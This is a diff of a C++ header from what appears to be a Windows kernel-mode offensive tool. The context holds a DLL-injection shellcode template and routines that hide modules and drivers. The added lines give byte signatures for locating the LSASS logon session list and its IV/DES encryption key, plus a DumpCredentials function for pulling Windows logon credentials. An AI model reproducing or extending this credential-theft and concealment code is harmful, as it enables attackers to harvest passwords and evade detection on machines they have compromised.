@@ -22,6 +22,8 @@ constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
 constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
 constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
 constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
+constexpr UCHAR LogonSessionListLocation[] = {0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF};
+constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };
 
 inline UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
 	0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
@@ -155,6 +157,7 @@ struct Credentials {
 struct LsassInformation {
 	PVOID IV;
 	PVOID DesKey;
+	ULONG Count;
 	Credentials* Creds;
 };
 
@@ -205,6 +208,7 @@ public:
 	NTSTATUS HideModule(HiddenModuleInformation* ModuleInformation);
 	NTSTATUS HideDriver(HiddenDriverInformation* DriverInformation);
 	NTSTATUS UnhideDriver(HiddenDriverInformation* DriverInformation);
+	NTSTATUS DumpCredentials(LsassInformation* LsassInformation);
 
 	bool FoundNtCreateThreadEx() { return NtCreateThreadEx != NULL; }
 	ULONG GetHiddenDrivers() { return this->hiddenDrivers.Count; }
